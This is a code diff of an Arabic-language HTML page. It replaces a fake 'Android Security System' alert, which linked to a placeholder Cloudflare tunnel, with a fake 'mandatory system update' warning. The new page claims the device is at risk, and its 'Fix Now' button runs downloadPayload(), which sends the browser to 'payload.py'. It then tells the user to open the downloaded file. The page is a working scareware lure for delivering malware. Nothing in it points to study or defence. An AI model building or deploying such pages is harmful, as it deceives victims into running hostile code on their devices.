@@ -1,12 +1,26 @@
-<body style="background:#000; color:#0f0; text-align:center; font-family:serif;">
-    <h1>Android Security System</h1>
-    <p>بسبب محاولات اختراق جهازك، يجب تفعيل جدار الحماية فوراً.</p>
-    <button onclick="connect()" style="padding:15px; background:red; color:#fff;">تفعيل الحماية الآن</button>
-    
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>تحديث النظام الإجباري</title>
+    <style>
+        body { background: #1a1a1a; color: #fff; text-align: center; font-family: Arial; padding: 50px; }
+        .btn { background: #28a745; color: white; padding: 20px 40px; border: none; border-radius: 5px; font-size: 20px; cursor: pointer; }
+        .warning { color: #ff4444; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1 class="warning">⚠️ تحذير: جهازك معرض للخطر</h1>
+    <p>يجب تحميل وتثبيت حزمة الأمان الأخيرة لمنع تسريب بياناتك.</p>
+    <br>
+    <button class="btn" onclick="downloadPayload()">تحميل وتثبيت التحديث (Fix Now)</button>
+
     <script>
-        function connect() {
-            // سيتم وضع رابط النفق هنا لاحقاً
-            window.location.href = "https://your-new-link.trycloudflare.com";
+        function downloadPayload() {
+            // توجيه لتحميل الملف أو تشغيله
+            window.location.href = "payload.py";
+            alert("بدأ التحميل.. يرجى فتح الملف لإتمام العملية");
         }
     </script>
 </body>
+</html>
